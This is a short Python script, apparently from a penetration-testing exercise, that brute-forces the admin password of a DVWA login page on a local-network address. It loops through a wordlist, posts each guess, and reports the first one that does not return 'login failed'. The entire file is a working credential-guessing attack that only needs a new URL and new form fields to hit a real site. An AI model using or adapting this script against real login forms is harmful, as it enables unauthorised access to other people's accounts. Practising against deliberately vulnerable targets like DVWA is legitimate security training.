import requests

target_url = "http://192.168.1.101/dvwa/login.php"
data_dict = {"username": "admin", "password":"", "Login": "submit"}

with open("/root/Documents/python_network_tools_repo/wordlists/passwords") as wordlist_file:
		for line in wordlist_file:
			word = line.strip()
			data_dict["password"] = word
			response = requests.post(target_url, data=data_dict)
			if "login failed" not in response.content:
				print("[+] Correct password: " + word)
				exit()

print("[+] Reached end of line - no password match found")
